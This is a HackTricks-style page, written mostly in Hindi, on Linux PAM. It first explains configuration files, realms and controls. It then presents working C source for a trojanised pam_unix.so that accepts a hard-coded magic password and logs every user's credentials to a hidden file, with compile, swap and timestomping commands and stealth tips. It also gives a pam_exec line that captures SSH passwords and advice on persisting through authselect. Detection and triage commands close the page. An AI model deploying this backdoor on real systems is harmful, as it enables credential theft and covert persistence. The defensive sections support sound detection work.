# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### मूलभूत जानकारी

**PAM (Pluggable Authentication Modules)** एक security mechanism के रूप में कार्य करता है, जो **computer services तक पहुंचने का प्रयास करने वाले users की पहचान verify करता है**, और विभिन्न criteria के आधार पर उनकी access को नियंत्रित करता है। यह एक digital gatekeeper के समान है, जो सुनिश्चित करता है कि केवल authorized users ही specific services के साथ interact कर सकें और system overload को रोकने के लिए उनके usage को सीमित भी कर सकता है।

#### Configuration Files

- **Solaris और UNIX-based systems** आमतौर पर `/etc/pam.conf` पर स्थित एक central configuration file का उपयोग करते हैं।
- **Linux systems** directory-based approach पसंद करते हैं और service-specific configurations को `/etc/pam.d` के भीतर store करते हैं। उदाहरण के लिए, login service की configuration file `/etc/pam.d/login` पर मिलती है।

Login service के लिए PAM configuration का एक example इस तरह दिख सकता है:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

ये realms या management groups, **auth**, **account**, **password**, और **session** को शामिल करते हैं, जिनमें से प्रत्येक authentication और session management process के अलग-अलग पहलुओं के लिए जिम्मेदार है:

- **Auth**: User identity को validate करता है, अक्सर password के लिए prompt करके।
- **Account**: Account verification संभालता है और group membership या time-of-day restrictions जैसी conditions की जांच करता है।
- **Password**: Password updates manage करता है, जिसमें complexity checks या dictionary attacks prevention शामिल हैं।
- **Session**: Service session की शुरुआत या समाप्ति के दौरान होने वाली actions को manage करता है, जैसे directories mount करना या resource limits सेट करना।

#### **PAM Module Controls**

Controls module के success या failure पर response को निर्धारित करते हैं और overall authentication process को प्रभावित करते हैं। इनमें शामिल हैं:

- **Required**: Required module की failure से अंततः failure होता है, लेकिन उससे पहले सभी subsequent modules की जांच की जाती है।
- **Requisite**: Failure होने पर process तुरंत terminate हो जाता है।
- **Sufficient**: Success होने पर उसी realm के बाकी checks bypass हो जाते हैं, जब तक कि कोई subsequent module fail न हो।
- **Optional**: Failure केवल तब होती है जब यह stack में अकेला module हो।

#### Offensive Semantics That Matter

PAM को backdoor करते समय, inserted rule का **location** अक्सर payload से अधिक महत्वपूर्ण होता है:

- `include` और `substack` अन्य files से rules लाते हैं, इसलिए `sshd` को edit करने से केवल SSH प्रभावित हो सकता है, जबकि `system-auth`, `common-auth`, या किसी अन्य shared stack को edit करने से एक साथ कई services प्रभावित हो सकती हैं।
- PAM bracketed controls जैसे `[success=1 default=ignore]` को भी support करता है। इनका दुरुपयोग successful custom check के बाद एक या अधिक modules को **skip** करने के लिए किया जा सकता है, बजाय इसके कि `pam_unix.so` को स्पष्ट रूप से replace किया जाए।
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) या default PAM module directory के सापेक्ष **relative** हो सकता है। Modern Linux systems पर वास्तविक directories अक्सर `/lib/security`, `/lib64/security`, `/usr/lib/security`, या `/usr/lib/x86_64-linux-gnu/security` जैसे multiarch paths होती हैं।

Quick operator takeaway: patching से पहले हमेशा **full service graph** map करें। उदाहरण के लिए, कुछ distros पर `sshd -> password-auth -> system-auth` या अन्य पर `sshd -> system-remote-login -> system-login -> system-auth` होने का अर्थ है कि वही one-line implant intended से कहीं अधिक व्यापक रूप से फैल सकता है।

#### Example Scenario

कई auth modules वाले setup में process एक strict order का पालन करता है। यदि `pam_securetty` module login terminal को unauthorized पाता है, तो root logins block हो जाते हैं, फिर भी इसके "required" status के कारण सभी modules process किए जाते हैं। `pam_env` environment variables set करता है, जो user experience में संभावित रूप से सहायता कर सकते हैं। `pam_ldap` और `pam_unix` modules user को authenticate करने के लिए साथ मिलकर काम करते हैं, जिसमें `pam_unix` पहले से दिए गए password का उपयोग करने का प्रयास करता है और authentication methods में efficiency तथा flexibility बढ़ाता है।


## Backdooring PAM – Hooking `pam_unix.so`

High-value Linux environments में एक classic persistence trick है **legitimate PAM library को trojanised drop-in से swap करना**। क्योंकि प्रत्येक SSH / console login अंततः `pam_unix.so:pam_sm_authenticate()` को call करता है, इसलिए credentials capture करने या *magic* password bypass implement करने के लिए C की कुछ lines ही पर्याप्त हैं।

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile और stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – एक temp file में लिखें और आधी-लिखी libraries से बचने के लिए उसे `mv` द्वारा सही स्थान पर रखें, जो SSH को lock out कर सकती हैं।
2. `/usr/bin/.dbus.log` जैसी log file placement legitimate desktop artefacts के साथ घुल-मिल जाती है।
3. PAM के गलत व्यवहार से बचने के लिए symbol exports (`pam_sm_setcred`, आदि) समान रखें।

### Detection
* `pam_unix.so` के MD5/SHA256 की तुलना distro package से करें।
* बिना manual hashing के replaced libraries का पता लगाने के लिए `rpm -V pam` या `debsums -s libpam-modules` चलाएँ।
* `/lib/security/` के अंतर्गत world-writable या असामान्य ownership की जाँच करें।
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* अनपेक्षित modules के लिए PAM configs में grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Persistence के लिए `pam_exec` का Abuse
`pam_unix.so` को replace करने के बजाय, `/etc/pam.d/sshd` में एक `pam_exec` line जोड़ना कम हस्तक्षेप वाला तरीका है, जिससे हर SSH login पर एक implant launch होता है और normal stack intact रहता है:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` PAM metadata को `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` और `PAM_TYPE` जैसे environment variables में प्राप्त करता है। `expose_authtok` के साथ, helper `auth` या `password` phases के दौरान `stdin` से password भी पढ़ सकता है। यदि आप helper को real UID के बजाय effective UID के साथ चलाना चाहते हैं, तो `seteuid` जोड़ें।

Practical notes:

- `session optional pam_exec.so ...` **post-login actions** के लिए बेहतर है, जैसे sockets को फिर से खोलना या detached daemon को spawn करना।
- `auth optional pam_exec.so quiet expose_authtok ...` आमतौर पर **credential capture** के लिए चुना जाता है, क्योंकि यह session खुलने से पहले चलता है।
- Execution को किसी विशिष्ट PAM phase तक सीमित करने और noisy double execution से बचने के लिए `type=session` या `type=auth` का उपयोग किया जा सकता है।

### Distro tooling से बचना: `authselect`

RHEL, CentOS Stream, Fedora और derivative systems पर `/etc/pam.d/system-auth` या `/etc/pam.d/password-auth` जैसी generated files में किए गए direct edits को **`authselect` overwrite कर सकता है**। Persistence के लिए, operators अक्सर `/etc/authselect/custom/<profile>/` के अंतर्गत active custom profile में patch करते हैं और फिर उसे re-select या apply करते हैं।

जब आपके पास root हो, तो सामान्य workflow:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
यह offense और triage दोनों के लिए महत्वपूर्ण है: यदि `/etc/pam.d/system-auth` में `Generated by authselect` और `Do not modify this file manually` banner मौजूद है, तो वास्तविक persistence point `/etc/pam.d/` के बजाय `/etc/authselect/custom/` के अंतर्गत हो सकता है।

### हाल ही में देखी गई tradecraft

2025 की हालिया reporting में **Plague** Linux backdoor ने इसी core idea को और आगे बढ़ाया: एक malicious PAM component जिसमें **static bypass password** था, साथ ही login के बाद session traces कम करने के लिए SSH-संबंधित environment variables और shell history (`HISTFILE=/dev/null`) की cleanup की गई। यह एक उपयोगी hunting pattern है, क्योंकि backdoor logic PAM में हो सकता है, जबकि stealth artifacts केवल authentication सफल होने **के बाद** दिखाई दे सकते हैं।


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: Linux के लिए नया खोजा गया PAM-Based Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
